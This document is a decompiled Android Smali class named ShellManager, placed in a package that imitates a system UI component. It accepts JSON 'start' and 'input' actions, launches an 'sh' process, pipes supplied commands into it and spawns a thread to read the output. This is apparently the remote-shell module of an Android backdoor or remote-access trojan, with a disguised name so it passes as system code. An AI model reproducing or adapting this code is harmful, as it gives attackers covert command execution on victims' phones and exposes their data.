.class public Lcom/system/android/ui/ShellManager;
.super Ljava/lang/Object;

.field private static process:Ljava/lang/Process;
.field private static outputStream:Ljava/io/OutputStream;

.method public static handle(Lorg/json/JSONObject;)V
    .locals 5

    const-string v0, "action"
    invoke-virtual {p0, v0}, Lorg/json/JSONObject;->optString(Ljava/lang/String;)Ljava/lang/String;
    move-result-object v0

    const-string v1, "input"
    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v1
    if-eqz v1, :cond_input

    const-string v0, "command"
    invoke-virtual {p0, v0}, Lorg/json/JSONObject;->optString(Ljava/lang/String;)Ljava/lang/String;
    move-result-object p0
    invoke-static {p0}, Lcom/system/android/ui/ShellManager;->write(Ljava/lang/String;)V
    return-void

    :cond_input
    const-string v1, "start"
    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v0
    if-eqz v0, :cond_exit
    invoke-static {}, Lcom/system/android/ui/ShellManager;->start()V

    :cond_exit
    return-void
.end method

.method private static start()V
    .locals 4
    :try_start_0
    sget-object v0, Lcom/system/android/ui/ShellManager;->process:Ljava/lang/Process;
    if-eqz v0, :cond_init
    return-void

    :cond_init
    invoke-static {}, Ljava/lang/Runtime;->getRuntime()Ljava/lang/Runtime;
    move-result-object v0
    const-string v1, "sh"
    invoke-virtual {v0, v1}, Ljava/lang/Runtime;->exec(Ljava/lang/String;)Ljava/lang/Process;
    move-result-object v0
    sput-object v0, Lcom/system/android/ui/ShellManager;->process:Ljava/lang/Process;

    invoke-virtual {v0}, Ljava/lang/Process;->getOutputStream()Ljava/io/OutputStream;
    move-result-object v1
    sput-object v1, Lcom/system/android/ui/ShellManager;->outputStream:Ljava/io/OutputStream;

    # Start reader thread
    new-instance v1, Ljava/lang/Thread;
    new-instance v2, Lcom/system/android/ui/ShellManager$1;
    invoke-virtual {v0}, Ljava/lang/Process;->getInputStream()Ljava/io/InputStream;
    move-result-object v0
    invoke-direct {v2, v0}, Lcom/system/android/ui/ShellManager$1;-><init>(Ljava/io/InputStream;)V
    invoke-direct {v1, v2}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V
    invoke-virtual {v1}, Ljava/lang/Thread;->start()V
    :try_end_0
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_0
    return-void

    :catch_0
    move-exception v0
    invoke-virtual {v0}, Ljava/io/IOException;->printStackTrace()V
    return-void
.end method

.method private static write(Ljava/lang/String;)V
    .locals 2
    :try_start_0
    sget-object v0, Lcom/system/android/ui/ShellManager;->outputStream:Ljava/io/OutputStream;
    if-nez v0, :cond_do
    invoke-static {}, Lcom/system/android/ui/ShellManager;->start()V
    sget-object v0, Lcom/system/android/ui/ShellManager;->outputStream:Ljava/io/OutputStream;

    :cond_do
    if-eqz v0, :cond_exit
    new-instance v1, Ljava/lang/StringBuilder;
    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V
    invoke-virtual {v1, p0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    const-string p0, "\n"
    invoke-virtual {v1, p0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
    move-result-object p0
    invoke-virtual {p0}, Ljava/lang/String;->getBytes()[B
    move-result-object p0
    invoke-virtual {v0, p0}, Ljava/io/OutputStream;->write([B)V
    invoke-virtual {v0}, Ljava/io/OutputStream;->flush()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :cond_exit
    return-void

    :catch_0
    return-void
.end method
